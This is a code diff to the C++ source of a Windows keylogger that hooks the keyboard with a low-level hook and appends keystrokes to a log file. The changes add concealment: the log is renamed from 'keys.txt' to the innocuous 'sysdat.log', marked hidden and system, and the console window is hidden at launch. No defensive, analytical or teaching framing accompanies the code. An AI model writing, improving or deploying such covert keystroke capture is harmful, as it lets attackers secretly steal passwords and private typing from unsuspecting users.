@@ -6,12 +6,11 @@
 #include <tchar.h>
  
 using namespace std;
- 
+
 string myKey;
 BOOL isCaps();
  
-char logName[] = "keys.txt";//LOG FILE name
-
+char logName[] = "sysdat.log";//LOG FILE name
 //init all varibles for speed
 MSG message;
 HHOOK keyboardHook;
@@ -21,12 +20,12 @@ unsigned int sc;
 
 void writeToLog(string s) //write a string to the log
 {
-    
-     ofstream log(logName, ios::app); //opens log file
+    SetFileAttributes (_T(logName), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+    ofstream log(logName, ios::app); //opens log file
+          
+    log << s; //writes to log.. with format '['']'
       
-     log << s; //writes to log.. with format '['']'
-      
-     log.close(); //closes log
+    log.close(); //closes log
 }
 BOOL isCaps()
 {
@@ -121,6 +120,8 @@ void msgLoop()
 int WINAPI WinMain(HINSTANCE hInstance, 
 HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
+    
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
     keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, 
         hookProc, hInstance, 0); //hooks keyboard
      
